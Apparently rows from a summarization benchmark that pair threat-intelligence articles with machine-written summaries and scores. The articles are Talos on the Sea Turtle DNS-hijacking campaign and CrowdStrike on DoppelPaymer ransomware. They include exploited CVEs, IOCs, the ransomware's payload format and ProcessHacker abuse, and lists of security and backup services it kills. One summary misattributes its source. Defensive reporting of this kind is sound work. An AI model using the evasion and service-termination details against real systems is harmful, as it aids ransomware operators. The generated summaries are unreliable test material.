(Unpacked)Yara rules";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://blog.talosintelligence.com/seaturtle/;DNS Hijacking Abuses Trust In Core Internet Service;"By Danny Adamitis, David Maynor, Warren Mercer, Matthew Olney and Paul Rascagneres.Update 4/18: A correction has been made to our research based on feedback from Packet Clearing House, we thank them for their assistancePrefaceThis blog post discusses the technical details of a state-sponsored attack manipulating DNS systems. While this incident is limited to targeting primarily national security organizations in the Middle East and North Africa, and we do not want to overstate the consequences of this specific campaign, we are concerned that the success of this operation will lead to actors more broadly attacking the global DNS system. DNS is a foundational technology supporting the Internet. Manipulating that system has the potential to undermine the trust users have on the internet. That trust and the stability of the DNS system as a whole drives the global economy. Responsible nations should avoid targeting this system, work together to establish an accepted global norm that this system and the organizations that control it are off-limits, and cooperate in pursuing those actors who act irresponsibly by targeting this system.Executive SummaryCisco Talos has discovered a new cyber threat campaign that we are calling ""Sea Turtle,"" which is targeting public and private entities, including national security organizations, located primarily in the Middle East and North Africa. The ongoing operation likely began as early as January 2017 and has continued through the first quarter of 2019. Our investigation revealed that at least 40 different organizations across 13 different countries were compromised during this campaign. We assess with high confidence that this activity is being carried out by an advanced, state-sponsored actor that seeks to obtain persistent access to sensitive networks and systems.The actors behind this campaign have focused on using DNS hijacking as a mechanism for achieving their ultimate objectives. DNS hijacking occurs when the actor can illicitly modify DNS name records to point users to actor-controlled servers. The Department of Homeland Security (DHS) issued an alert about this activity on Jan. 24 2019, warning that an attacker could redirect user traffic and obtain valid encryption certificates for an organization's domain names.In the Sea Turtle campaign, Talos was able to identify two distinct groups of victims. The first group, we identify as primary victims, includes national security organizations, ministries of foreign affairs, and prominent energy organizations. The threat actor targeted third-party entities that provide services to these primary entities to obtain access. Targets that fall into the secondary victim category include numerous DNS registrars, telecommunication companies, and internet service providers. One of the most notable aspects of this campaign was how they were able to perform DNS hijacking of their primary victims by first targeting these third-party entities.We assess with high confidence that these operations are distinctly different and independent from the operations performed by DNSpionage, which we reported on in November 2018. The Sea Turtle campaign almost certainly poses a more severe threat than DNSpionage given the actor's methodology in targeting various DNS registrars and registries. The level of access we presume necessary to engage in DNS hijacking successfully indicates an ongoing, high degree of threat to organizations in the targeted regions. Due to the effectiveness of this approach, we encourage all organizations, globally, to ensure they have taken steps to minimize the possibility of malicious actors duplicating this attack methodology.The threat actors behind the Sea Turtle campaign show clear signs of being highly capable and brazen in their endeavors. The actors are responsible for the first publicly confirmed case against an organizations that manages a root server zone, highlighting the attacker's sophistication. Notably, the threat actors have continued their attacks despite public reports documenting various aspects of their activity, suggesting they are unusually brazen and may be difficult to deter going forward. In most cases, threat actors typically stop or slow down their activities once their campaigns are publicly revealed.This post provides the technical findings you would typically see in a Talos blog. We will also offer some commentary on the threat actor's tradecraft, including possible explanations about the actor's attack methodology and thought process. Finally, we will share the IOCs that we have observed thus far, although we are confident there are more that we have not seen.Background on Domain Name Services and records managementThe threat actors behind the Sea Turtle campaign were successful in compromising entities by manipulating and falsifying DNS records at various levels in the domain name space. This section provides a brief overview of where DNS records are managed and how they are accessed to help readers better understand how these events unfolded.The first and most direct way to access an organization's DNS records is through the registrar with the registrant's credentials. These credentials are used to login to the DNS provider from the client-side, which is a registrar. If an attacker was able to compromise an organization's network administrator credentials, the attacker would be able to change that particular organization's DNS records at will.The second way to access DNS records is through a DNS registrar, sometimes called registrar operators. A registrar sells domain names to the public and manages DNS records on behalf of the registrant through the domain registry. Records in the domain registry are accessed through the registry application using the Extensible Provisioning Protocol (EPP). EPP was detailed in the request for comment (RFC) 5730 as ""a means of interaction between a registrar's applications and registry applications."" If the attackers were able to obtain one of these EPP keys, they would be able to modify any DNS records that were managed by that particular registrar.The third approach to gain access to DNS records is through one of the registries. These registries manage any known TLD, such as entire country code top-level domains (ccTLDs) and generic top-level domains (gTLDs). For example, Verisign manages all entities associated with the top-level domain (TLD) "".com."" All the different registry information then converges into one of 12 different organization that manage different parts of the domain registry root. The domain registry root is stored on 13 ""named authorities in the delegation data for the root zone,"" according to ICANN.Finally, actors could target root zone servers to modify the records directly. It is important to note that there is no evidence during this campaign (or any other we are aware of) that the root zone servers were attacked or compromised. We highlight this as a potential avenue that attackers would consider. The root DNS servers issued a joint statement that stated, ""There are no signs of lost integrity or compromise of the content of the root [server] zone...There are no signs of clients having received unexpected responses from root servers.""Assessed Sea Turtle DNS hijacking methodologyIt is important to remember that the DNS hijacking is merely a means for the attackers to achieve their primary objective. Based on observed behaviors, we believe the actor ultimately intended to steal credentials to gain access to networks and systems of interest. To achieve their goals, the actors behind Sea Turtle:Established a means to control the DNS records of the target. Modified DNS records to point legitimate users of the target to actor-controlled servers. Captured legitimate user credentials when users interacted with these actor-controlled servers.The diagram below illustrates how we believe the actors behind the Sea Turtle campaign used DNS hijacking to achieve their end goals.Redirection Attack Methodology DiagramOperational tradecraftInitial accessThe threat actors behind the Sea Turtle campaign gained initial access either by exploiting known vulnerabilities or by sending spear-phishing emails. Talos believes that the threat actors have exploited multiple known CVEs to either gain initial access or to move laterally within an affected organization. Based on our research, we know the actor utilizes the following known exploits:CVE-2009-1151: PHP code injection vulnerability affecting phpMyAdminCVE-2014-6271: RCE affecting GNU bash system, specifically the SMTP (this was part of the Shellshock CVEs)CVE-2017-3881: RCE by unauthenticated user with elevated privileges Cisco switchesCVE-2017-6736: Remote Code Exploit (RCE) for Cisco integrated Service Router 2811CVE-2017-12617: RCE affecting Apache web servers running TomcatCVE-2018-0296: Directory traversal allowing unauthorized access to Cisco Adaptive Security Appliances (ASAs) and firewallsCVE-2018-7600: RCE for Website built with Drupal, aka ""Drupalgeddon""As of early 2019, the only evidence of the spear-phishing threat vector came from a compromised organization's public disclosure. On January 4, Packet Clearing House, which is not an Internet exchange point but rather is an NGO which provides support to Internet exchange points and the core of the domain name system, provided confirmation of this aspect of the actors' tactics when it publicly revealed its internal DNS had been briefly hijacked as a consequence of the compromise at its domain registrar.As with any initial access involving a sophisticated actor, we believe this list of CVEs to be incomplete. The actor in question can leverage known vulnerabilities as they encounter a new threat surface. This list only represents the observed behavior of the actor, not their complete capabilities.Globalized DNS hijacking activity as an infection vectorDuring a typical incident, the actor would modify the NS records for the targeted organization, pointing users to a malicious DNS server that provided actor-controlled responses to all DNS queries. The amount of time that the targeted DNS record was hijacked can range from a couple of minutes to a couple of days. This type of activity could give an attacker the ability to redirect any victim who queried for that particular domain around the world. Other cybersecurity firms previously reported some aspects of this activity. Once the actor-controlled name server was queried for the targeted domain, it would respond with a falsified ""A"" record that would provide the IP address of the actor-controlled MitM node instead of the IP address of the legitimate service. In some instances, the threat actors modified the time-to-live (TTL) value to one second. This was likely done to minimize the risk of any records remaining in the DNS cache of the victim machine.During 2019, we observe the following name servers being used in support of the Sea Turtle campaign:Domain Active Timeframe ns1[.]intersecdns[.]com March - April 2019 ns2[.]intersecdns[.]com March - April 2019 ns1[.]lcjcomputing[.]com January 2019 ns2[.]lcjcomputing[.]com January 2019Credential harvesting: Man-in-the-middle serversOnce the threat actors accessed a domain's DNS records, the next step was to set up a man-in-the-middle (MitM) framework on an actor-controlled server.The next step for the actor was to build MitM servers that impersonated legitimate services to capture user credentials. Once these credentials were captured, the user would then be passed to the legitimate service. to evade detection, the actors performed ""certificate impersonation,"" a technique in which the attacker obtained a certificate authority-signed X.509 certificate from another provider for the same domain imitating the one already used by the targeted organization. For example, if a DigiCert certificate protected a website, the threat actors would obtain a certificate for the same domain but from another provider, such as Let's Encrypt or Comodo. This tactic would make detecting the MitM attack more difficult, as a user's web browser would still display the expected ""SSL padlock"" in the URL bar.When the victim entered their password into the attacker's spoofed webpage, the actor would capture these credentials for future use. The only indication a victim received was a brief lag between when the user entered their information and when they obtained access to the service. This would also leave almost no evidence for network defenders to discover, as legitimate network credentials were used to access the accounts.In addition to the MitM server IP addresses published in previous reports, Talos identified 16 additional servers leveraged by the actor during the observed attacks. The complete list of known malicious IP addresses are in the Indicators of Compromise (IOC) section below.Credential harvesting with compromised SSL certificatesOnce the threat actors appeared to have access to the network, they stole the organization's SSL certificate. The attackers would then use the certificate on actor-controlled servers to perform additional MitM operations to harvest additional credentials. This allowed the actors to expand their access into the targeted organization's network. The stolen certificates were typically only used for less than one day, likely as an operational security measure. Using stolen certificates for an extended period would increase the likelihood of detection. In some cases, the victims were redirected to these actor-controlled servers displaying the stolen certificate.One notable aspect of the campaign was the actors' ability to impersonate VPN applications, such as Cisco Adaptive Security Appliance (ASA) products, to perform MitM attacks. At this time, we do not believe that the attackers found a new ASA exploit. Rather, they likely abused the trust relationship associated with the ASA's SSL certificate to harvest VPN credentials to gain remote access to the victim's network. This MitM capability would allow the threat actors to harvest additional VPN credentials.As an example, DNS records indicate that a targeted domain resolved to an actor-controlled MitM server. The following day, Talos identified an SSL certificate with the subject common name of ""ASA Temporary Self Signed Certificate"" associated with the aforementioned IP address. This certificate was observed on both the actor-controlled IP address and on an IP address correlated with the victim organization.In another case, the attackers were able to compromise NetNod, a non-profit, independent internet infrastructure organization based in Sweden. NetNod acknowledged the compromise in a public statement on February 5, 2019. Using this access, the threat actors were able to manipulate the DNS records for sa1[.]dnsnode[.]net. This redirection allowed the attackers to harvest credentials of administrators who manage domains with the TLD of Saudi Arabia (.sa). It is likely that there are additional Saudi Arabia-based victims from this attack.In one of the more recent campaigns on March 27, 2019, the threat actors targeted the Sweden-based consulting firm Cafax. On Cafax's public webpage, the company states that one of their consultants actively manages the i[.]root-server[.]net zone. NetNod managed this particular DNS server zone. We assess with high confidence that this organization was targeted in an attempt to re-establish access to the NetNod network, which was previously compromised by this threat actor.Primary and secondary victimsWe identified 40 different organizations that have been targeted during this campaign. The victim organizations appear to be broadly grouped into two different categories. The first group of victims, which we refer to as primary victims, were almost entirely located in the Middle East and North Africa. Some examples of organizations that were compromised include:Ministries of foreign affairsMilitary organizationsIntelligence agenciesProminent energy organizationsThe second cluster of victim organizations were likely compromised to help enable access to these primary targets. These organizations were located around the world, however, they were mostly concentrated in the Middle East and North Africa. Some examples of organizations that were compromised include:Telecommunications organizationsInternet service providersInformation technology firmsRegistrarsOne registryNotably, the threat actors were able to gain access to registrars that manage ccTLDs for Amnic, which is listed as the technical contact on IANA for the ccTLD .am. Obtaining access to this ccTLD registrars would have allowed attackers to hijack any domain that used those ccTLDs.How is this tradecraft different?The threat actors behind the Sea Turtle campaign have proven to be highly capable, as they have been able to perform operations for over two years and have been undeterred by public reports documenting various aspects of their activity. This cyber threat campaign represents the first known case of a domain name registry organization that was compromised for cyber espionage operations.In order to distinguish this activity from the previous reporting on other attackers, such as those affiliated with DNSpionage, below is a list of traits that are unique to the threat actors behind the Sea Turtle campaign:These actors perform DNS hijacking through the use of actor-controlled name servers.These actors have been more aggressive in their pursuit targeting DNS registries and a number of registrars, including those that manage ccTLDs.These actors use Let's Encrypts, Comodo, Sectigo, and self-signed certificates in their MitM servers to gain the initial round of credentials.Once they have access to the network, they steal the organization's legitimate SSL certificate and use it on actor-controlled servers.Why was it so successful?We believe that the Sea Turtle campaign continues to be highly successful for several reasons. First, the actors employ a unique approach to gain access to the targeted networks. Most traditional security products such as IDS and IPS systems are not designed to monitor and log DNS requests. The threat actors were able to achieve this level of success because the DNS domain space system added security into the equation as an afterthought. Had more ccTLDs implemented security features such as registrar locks, attackers would be unable to redirect the targeted domains.The threat actors also used an interesting techniques called certificate impersonation. This technique was successful in part because the SSL certificates were created to provide confidentiality, not integrity. The attackers stole organizations' SSL certificates associated with security appliances such as ASA to obtain VPN credentials, allowing the actors to gain access to the targeted network.The threat actors were able to maintain long term persistent access to many of these networks by utilizing compromised credentials.We will continue to monitor Sea Turtle and work with our partners to understand the threat as it continues to evolve to ensure that our customers remain protected and the public is informed.Mitigation strategyIn order to best protect against this type of attack, we compiled a list of potential actions. Talos suggests using a registry lock service, which will require an out-of-band message before any changes can occur to an organization's DNS record. If your registrar does not offer a registry lock service, we recommend implementing multi-factor authentication, such as DUO, to access your organization's DNS records. If you suspect you were targeted by this type of activity intrusion, we recommend instituting a network-wide password reset, preferably from a computer on a trusted network. Lastly, we recommend applying patches, especially on internet-facing machines. Network administrators can monitor passive DNS record on their domains, to check for abnormalities.CoverageCVE-2009-1151: PHP code injection vulnerability affecting phpMyAdminSID: 2281CVE-2014-6271: RCE affecting GNU bash system, specific the SMTP (this was part of the Shellshock CVEs)SID: 31975 - 31978, 31985, 32038, 32039, 32041 - 32043, 32069, 32335, 32336CVE-2017-3881: RCE for Cisco switchesSID: 41909 - 41910CVE-2017-6736: Remote Code Exploit (RCE) for Cisco integrated Service Router 2811SID: 43424 - 43432CVE-2017-12617: RCE affecting Apache web servers running TomcatSID: 44531CVE-2018-0296: Directory traversal to gain unauthorized access to Cisco Adaptive Security Appliances (ASAs) and FirewallsSID: 46897CVE-2018-7600: RCE for Website built with Drupal aka ""Drupalgeddon""SID: 46316Indicators of CompromiseThe threat actors utilized leased IP addresses from organizations that offer virtual private server (VPS) services. These VPS providers have since resold many of these IP addresses to various benign customers. To help network defenders, we have included the IP address, as well as the month(s) that the IP address was associated with the threat actor.IP address Month Year Country of targets 199.247.3.191 November 2018 Albania, Iraq 37.139.11.155 November 2018 Albania, UAE 185.15.247.140 January 2018 Albania 206.221.184.133 November 2018 Egypt 188.166.119.57 November 2018 Egypt 185.42.137.89 November 2018 Albania 82.196.8.43 October 2018 Iraq 159.89.101.204 December - January 2018-2019 Turkey, Sweden, Syria, Armenia, US 146.185.145.202 March 2018 Armenia 178.62.218.244 December - January 2018-2019 UAE, Cyprus 139.162.144.139 December 2018 Jordan 142.54.179.69 January - February 2017 Jordan 193.37.213.61 December 2018 Cyprus 108.61.123.149 February 2019 Cyprus 212.32.235.160 September 2018 Iraq 198.211.120.186 September 2018 Iraq 146.185.143.158 September 2018 Iraq 146.185.133.141 October 2018 Libya 185.203.116.116 May 2018 UAE 95.179.150.92 November 2018 UAE 174.138.0.113 September 2018 UAE 128.199.50.175 September 2018 UAE 139.59.134.216 July - December 2018 United States, Lebanon 45.77.137.65 March - April 2019 Syria, Sweden 142.54.164.189 March - April 2019 Syria 199.247.17.221 March 2019 SwedenThe following list contains the threat actor name server domains and their IP address.";The ITSecurity report provides an indepth analysis of the Sea Turtle campaign. The report discusses the tactics used by the threat actors to gain access to the targeted organization's network. The report also provides an overview of the malicious IP addresses used by the threat actors, as well as the indicators of compromise (IOCs) associated with the campaign. The ITSecurity report found that the threat actors were targeting organizations in the Middle East and North Africa, as well as organizations around the world in order to gain access to these primary targets. The following list contains the threat actor name server domains and their IP address.;en;{'r': 0.04774083546462063, 'p': 0.8888888888888888, 'f': 0.09061488576393471};{'r': 0.020817562452687358, 'p': 0.625, 'f': 0.04029303966913282};{'r': 0.04688832054560955, 'p': 0.873015873015873, 'f': 0.08899676278658844}
https://www.crowdstrike.com/blog/doppelpaymer-ransomware-and-dridex-2/;CrowdStrike Discovers New DoppelPaymer Ransomware & Dridex Variant;"CrowdStrike(r) Intelligence has identified a new ransomware variant identifying itself as BitPaymer. This new variant was behind a series of ransomware campaigns beginning in June 2019, including attacks against the City of Edcouch, Texas and the Chilean Ministry of Agriculture.We have dubbed this new ransomware DoppelPaymer because it shares most of its code with the BitPaymer ransomware operated by INDRIK SPIDER. However, there are a number of differences between DoppelPaymer and BitPaymer, which may signify that one or more members of INDRIK SPIDER have split from the group and forked the source code of both Dridex and BitPaymer to start their own Big Game Hunting ransomware operation.INDRIK SPIDER OriginsINDRIK SPIDER was formed in 2014 by former affiliates of the GameOver Zeus criminal network who internally referred to themselves as ""The Business Club."" Shortly after the group's inception, INDRIK SPIDER developed their own custom malware known as Dridex. Early versions of Dridex were primitive, but over the years the malware became increasingly professional and sophisticated. In fact, Dridex operations were significant throughout 2015 and 2016, making it one of the most prevalent eCrime malware families. At this time, INDRIK SPIDER was primarily conducting wire fraud, resulting in the loss of millions of dollars globally.Over time, INDRIK SPIDER encountered a number of obstacles to their wire fraud operations. First, in 2015 the group had to overcome a takedown operation, which resulted in the arrest of one of its affiliates, who used the alias ""Smilex."" This setback was followed by a law enforcement operation in the U.K. designed to break up the money laundering network supporting INDRIK SPIDER's monetization of Dridex campaigns. The dismantling of this network also coincided with the arrest, and subsequent imprisonment, of a U.K. bank employee who helped set up fake accounts.Perhaps as a result of these obstacles, INDRIK SPIDER changed their methods of operation in 2017, conducting smaller Dridex distribution campaigns. In August 2017, the group introduced BitPaymer ransomware and began to focus on leveraging access within a victim organization to demand a high ransom payment.BitPaymer OriginsCrowdStrike Intelligence, has tracked the original BitPaymer since it was first identified in August 2017. In its first iteration, the BitPaymer ransom note included the ransom demand and a URL for a TOR-based payment portal. The payment portal included the title ""Bit paymer"" along with a reference ID, a Bitcoin (BTC) wallet, and a contact email address. An example of this portal is shown in Figure 1.Within the first month of operation, the ransom amount was dropped from the ransom note. In July 2018, the payment portal URL was also removed. From July 2018 until present, the ransom note has only included two contact emails, which are used to negotiate the ransom.Latest BitPaymer VersionIn November 2018, there was a significant update to BitPaymer. The ransom note was updated to include the victim's name, and the file extension appended to encrypted files was also customized to use a representation of the victim's name. An example of the new ransom note is shown below in Figure 2.In addition to the updated ransom note and encrypted file extension, BitPaymer's file encryption routine was updated to use 256-bit AES in cipher block chaining (CBC) mode with a randomly generated key and a NULL initialization vector. Previous versions of BitPaymer had used 128-bit RC4.Since AES is a block cipher, the implementation requires padding in cases where the data is not a multiple of the block size. Typically, this is implemented by adding zeros or the number n of padding bytes n times (also known as PKCS7). However, INDRIK SPIDER chose to generate n bytes randomly for padding. As a result, the malware developer had to preserve the random padding bytes in order to correctly decrypt the last data block of an encrypted file. This is reflected in the BitPaymer ransom note with a new field of TAIL , as shown above in Figure 2, which contains the Base64-encoded TAIL padding and encrypted AES KEY.Interestingly, the BitPaymer developers implemented an encryption initialization function in the ransomware code that selects one of three desired encryption algorithms. The algorithm is chosen by an argument that is passed as an integer parameter to the function. The current values supported are 1, 2, and 3 for 128-bit RC4, 128-bit AES and 256-bit AES, respectively. Newer versions of BitPaymer pass the hard-coded value of 3 for 256-bit AES encryption into the function, as shown in Figure 3.Along with the updated file encryption routine, the size of the victim-specific RSA public key has also been increased from 1,024-bit to 4,096-bit. This asymmetric key is used to encrypt the generated symmetric file encryption keys. If the ransom is paid, INDRIK SPIDER will provide a decryption tool that contains the corresponding victim's RSA private key.It is unclear why INDRIK SPIDER moved from RC4 to AES encryption, but it may be due to concerns about the relative weakness of RC4 in comparison to AES. The increase in the RSA key size also greatly augments the cryptographic strength protecting the file encryption keys. However, there is no evidence that BitPaymer's prior or current encryption has been broken.Since the update in November 2018, INDRIK SPIDER has actively used the latest version of BitPaymer in at least 15 confirmed ransomware attacks. These attacks have continued throughout 2019, with multiple incidents occurring in June and July of 2019 alone.Meet DoppelPaymerWhile the first known victims of DoppelPaymer were targeted in June 2019, we were able to recover earlier builds of the malware dating back to April 2019. These earlier builds are missing many of the new features found in later variants, so it is not clear if they were deployed to victims or if they were simply built for testing.To date, we have identified eight distinct malware builds and three confirmed victims with ransom amounts of 2 BTC, 40 BTC and 100 BTC. Based on the USD to BTC exchange rate at the time of this writing, these ransom amounts vary from approximately $25,000 to over $1,200,000.The ransom note used by DoppelPaymer is similar to those used by the original BitPaymer in 2018. The note does not include the ransom amount, however, it does contain a URL for a TOR-based payment portal, and instead of using the keyword KEY to identify the encrypted key, the note uses the keyword DATA as shown in Figure 4.The payment portal for DoppelPaymer is almost identical to the original BitPaymer portal. The ""Bit paymer"" title is still present on the web page and a unique ID is still used to identify the victim. The portal provides a ransom amount, a countdown timer and a BTC address where the ransom payment can be sent. An example of the DoppelPaymer ransom portal web page is shown below in Figure 5.DoppelPaymer and BitPaymer Encryption ComparisonAlthough DoppelPaymer and BitPaymer share significant amounts of code, there are some notable encryption differences, which are described in Table 1.DoppelPaymer BitPaymer Ransom note Each readme file contains an encrypted 256-bit AES key in a field named DATA . Each readme file contains an encrypted 256-bit AES key in a field named KEY . Older versions contained an encrypted 128-bit RC4 key in the KEY field. Current versions use anonymous email services such as ProtonMail for ransom payment negotiations. Encryption 2048-bit RSA + 256-bit AES 4096-bit RSA + 256-bit AES. Older versions used 1024-bit RSA + 128-bit RC4. Encryption (AES) padding scheme Standard padding (PKCS7) Random bytes specified in a field named TAIL Ransom filename Encrypted files are renamed with a .locked extension. Encrypted files are renamed with the victim name as the extension. Older versions are appended the suffix .locked to the names of encrypted files.Table 1. Encryption-Related Differences Between DoppelPaymer and BitPaymerThere are obvious similarities between the tactics, techniques and procedures (TTPs) used by DoppelPaymer and prior TTPs of BitPaymer, such as the use of TOR for ransom payment and the .locked extension. However, the code overlaps suggest that DoppelPaymer is a more recent fork of the latest version of BitPaymer. For example, in the latest version of BitPaymer, the code for RC4 string obfuscation reverses the bytes prior to encryption, and includes a helper function that provides support for multiple forms of symmetric encryption (i.e., RC4, 128-bit AES, and 256-bit AES), as shown in Figure 3.New DoppelPaymer Features and the Use of ProcessHackerIn addition to the changes discussed above, numerous modifications were made to the BitPaymer source code to improve and enhance DoppelPaymer's functionality. For instance, file encryption is now threaded, which can increase the rate at which files are encrypted. The network enumeration code was updated to parse the victim system's Address Resolution Protocol (ARP) table, retrieved with the command arp.exe -a . The resulting IP addresses of other hosts on the local network are combined with domain resolution results via nslookup.exe . (In a similar approach, previous versions of BitPaymer made use of the command net.exe view to enumerate network shares.)In addition, DoppelPaymer is designed to run only after a specific command line argument is provided. The malware computes a CRC32 checksum of the first argument passed on the command line and adds it with a constant value that is hard-coded in the binary. The malware then adds the instruction pointer address to this result, which becomes the destination for a jmp used to continue the malware execution. The hard-coded constant value is unique to each build. In the sampled analyzed, this value was 0x672e6eb7 , as shown below in Figure 6.If no arguments are provided, or if an incorrect value is provided on the command line, DoppelPaymer will crash. This design was likely intended to hinder automated malware analysis environments.Perhaps the most interesting change that the DoppelPaymer author made is to terminate processes and services that may interfere with file encryption. DoppelPaymer contains several lists of CRC32 checksums of process and service names that are blacklisted. The malware author included CRC32 checksums rather than strings to hinder reverse engineering efforts. However, it is possible to brute-force all of the checksums and recover the respective strings, as shown in Tables 7-11 found in the Appendix.ProcessHackerIn order to terminate some of these processes and services, DopplePaymer uses an interesting technique that leverages ProcessHacker, a legitimate open-source administrative utility. This application is bundled with a kernel driver that can be used to terminate processes and services. DoppelPaymer is bundled with six portable executable (PE) files that are encrypted and compressed in the malware's sdata section. These PE files contain 32-bit and 64-bit versions of the following:ProcessHacker applicationProcessHacker kernel driverA custom stager DLL that is used to exploit ProcessHackerThe modules are extracted by using the first 16 bytes of the sdata section as an RC4 key to decrypt the next 4 bytes of data, which is the size (big endian) of the subsequent encrypted data. The encrypted data that follows also uses the first 16 bytes as an RC4 key to decrypt the remaining data. The format is shown below in Table 2.16 Bytes 4 Bytes 16 Bytes M Bytes RC4 key Encrypted data size (M) RC4 key Encrypted dataTable 2. Format of Encrypted DoppelPaymer ProcessHacker Related ModulesAfter decryption, the first 4 bytes are the size of the compressed data, and the next 4 bytes are the size of the uncompressed data, followed by the compressed data as shown in Table 3.4 Bytes 4 Bytes N Bytes Compressed size (N bytes) Uncompressed size Compressed 32-bit and 64-bit Process Hacker modulesTable 3. Format of Encrypted DoppelPaymer ProcessHacker Related Modules Header and DataThe data is decompressed using aPLib, which produces the PE files in a custom structured format, where each PE contains an 8-byte header consisting of a magic 4-byte value, followed by another 4-byte value that specifies the size of the following PE data as shown in Table 4.4 Bytes 4 Bytes N Bytes 4 Bytes 4 Bytes N Bytes Magic value 1 Size of Module 1 Module 1 Magic value 2 Size of Module 2 Module 2 ...Table 4. DoppelPaymer ProcessHacker Packed Module FormatTable 5 contains the magic value and SHA256 hash for each ProcessHacker component.Magic Value SHA256 Description 0xf03d9386 51d8618ec86159327e883615ad8989c7638172cf801f65ab0367e5b2e6af596a DoppelPaymer's ProcessHacker Stager DLL (32-bit) 0xa68d9640 d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f ProcessHacker3 (32-bit) 0x53e9cd92 0f97f6d53fff47914174bc3a05fb016e2c02ed0b43c827e5e5aadba2d244aecc KProcessHacker3 Kernel Driver (32-bit) 0x2fb0f795 bfb7e62ba4ad5975e68a1beefb045cb72e056911fd7a8b070a15029dfcbbefe1 DoppelPaymer's ProcessHacker Stager DLL (64-bit) 0x7900f253 bd2c2cf0631d881ed382817afcce2b093f4e412ffb170a719e2762f250abfea4 ProcessHacker3 (64-bit) 0x8c64a981 70211a3f90376bbc61f49c22a63075d1d4ddd53f0aefa976216c46e6ba39a9f4 KProcessHacker3 Kernel Driver (64-bit)Table 5. Encrypted PE Files Embedded in DoppelPaymerAfter decompression, all three binaries are written to the same directory. Both ProcessHacker and the kernel driver are written as random filenames, but the stager DLL filename is chosen to be one of the DLL names imported by ProcessHacker. DoppelPaymer then executes ProcessHacker which loads the stager DLL via DLL search order hijacking. Once loaded, ProcessHacker's kernel driver is leveraged to kill the blacklisted processes.DoppelPaymer Links to ""Dridex 2.0""A Dridex loader sample, identified by SHA256 hash 813d8020f32fefe01b66bea0ce63834adef2e725801b4b761f5ea90ac4facd3a , was distributed through the Emotet malware on June 4, 2019. The Dridex sample contained code to decrypt either a 32-bit or a 64-bit core bot module from its sdata section using the exact same encryption, compression, and data format (previously described) that DoppelPaymer uses to extract PEs from its sdata section. This observation ties this Dridex variant directly with DoppelPaymer. The Dridex sample was also unusual, not only because the Dridex loader was bundled with the bot core module (rather than dynamically retrieving it from a C2 server), but also because the bot core module had a version number of 2.0.0.78. We have seen subsequent updates to this new variant of the Dridex bot core module with the latest version being 2.0.0.80 at the time of writing. Of note, prior samples of Dridex had a version number of 4.0.0.87. It's unclear why the malware author decided to use lower version numbers, but one explanation is that the threat actor views this new creation as ""Dridex 2.0.""ConclusionBoth BitPaymer and DoppelPaymer continue to be operated in parallel and new victims of both ransomware families have been identified in June and July 2019. The parallel operations, coupled with the significant code overlap between BitPaymer and DoppelPaymer, indicate not only a fork of the BitPaymer code base, but an entirely separate operation. This may suggest that the threat actor who is operating DoppelPaymer has splintered from INDRIK SPIDER and is now using the forked code to run their own Big Game Hunting ransomware operations.Additional ResourcesAppendix/IndicatorsIndicator Description 801b04a1504f167c25f568f8d7cbac13bdde6440a609d0dcd64ebe225c197f9b DoppelPaymer SHA256 hash 813d8020f32fefe01b66bea0ce63834adef2e725801b4b761f5ea90ac4facd3a Dridex 2.0 SHA256 hashTable 6. DoppelPaymer and Dridex 2.0 IOCsCRC32 String CRC32 String CRC32 String 0xc622a2b1 acronisagent 0x5c6cd7ac msexchangeum 0xe381a459 epredline 0xa8e4e8c2 backupexecagentaccelerator 0xab07d275 msexchangeumcr 0xe7a6b2c5 mozyprobackup 0x6d7d9112 backupexecdevicemediaservice 0xe3d46892 mssqlserver 0xdf73ec1c masvc 0xfef41240 backupexecjobengine 0xf203a569 msdtsserver 0xcc5f5bf1 macmnsvc 0x6c99d156 backupexecmanagementservice 0x6d90a649 mysql57 0x467255e4 mfemms 0x8ff434f5 backupexecrpcservice 0x2181c15e osearch15 0x0f2ae79c psqlwge 0xc08e25a9 backupexecvssprovider 0xcdf97a8b oracleclientcache80 0x7e26520a swprv 0x634332ff dfsr 0xcaff10b3 quickbooksdb25 0x656c0e35 wsbexchange 0xfd7e1ab0 epintegrationservice 0x00c7b7a9 spadminv4 0xde2373de winvnc4 0x69e7bca5 epprotectedservice 0x66a8eead spsearchhostcontroller 0x68507185 epsecurityservice 0x46b607c2 sptracev4 0x5809f6f7 epupdateservice 0xdb1ac7bb spusercodev4 0xc2b55fa6 mb3service 0xf3c045e4 spwriterv4 0xeca1f89e msexchangees 0xd917e4cb sqlbrowser 0x44dda068 msexchangemgmt 0x23bc321e sqlsafeolrservice 0xbebe6687 msexchangemta 0x9626475b sqlserveragent 0x03803c01 msexchangesa 0xf76fde75 sqltelemetry 0x0de53e33 msexchangesrs 0x9626475b sqlserveragent 0x822dd426 msexchangeadtopology 0x25a92500 sqlwriter 0xacedcdb8 msexchangedelivery 0x243d4975 syncoveryvssservice 0x9060bcd4 msexchangediagnostics 0xc2a56207 veeambackupsvc 0x50f0d551 msexchangeedgesync 0x8dbf54db veeamcatalogsvc 0xa300bbb0 msexchangehm 0x82d1c632 veeamcloudsvc 0x3040bb72 msexchangehmrecovery 0xb97407ef veeamendpointbackupsvc 0x4014b792 msexchangeis 0x0aabacba veeamenterprisemanagersvc 0x7e7e47bc msexchangemailboxreplication 0x43d71e6c veeammountsvc 0x23a626e2 msexchangerpc 0x0c6574ad veeamnfssvc 0xa323c785 msexchangerepl 0x2491fd1c veeamrestsvc 0xbfec4da3 msexchangeservicehost 0xe076d4a9 veeamtransportsvc 0xbe3d66d5 msexchangetransport 0xd67d1e60 epagTable 7. DoppelPaymer Email Server, Backup, and Database Software CRC32 BlacklistCRC32 String CRC32 String CRC32 String 0xae5a22b4 dropbox.exe 0xdc40adba onenote.exe 0x306d51a0 sidebar.exe 0x6274fa64 cis.exe 0x4107aa76 oracle.exe 0xf62526b9 cistray.exe 0xbfdf529e postgres.exeTable 8. DoppelPaymer Antivirus, Backup, Database, and Windows Tool CRC32 BlacklistCRC32 String CRC32 String CRC32 String 0x45a1c197 windefend 0x0b4fa6cf msmpsvc 0xe067db30 mcafeeframework 0x987163e9 wdnissvc 0x360b9799 sentinelagent 0xfc95ba9d mcafeeframeworkmcafeeframework 0x34220c33 cylancesvc 0xde3dabc7 ekrn 0x360b9799 sentinelagent 0x59d2dbbf mbamservice 0xb78f9b4e wrsvc 0x3b9f1b3e sentinelhelperservice 0x27462fff mbendpointagent 0x23b07ca0 vipre business service 0xa6772c96 sentinelstaticengine 0x93a7f221 sbamsvc 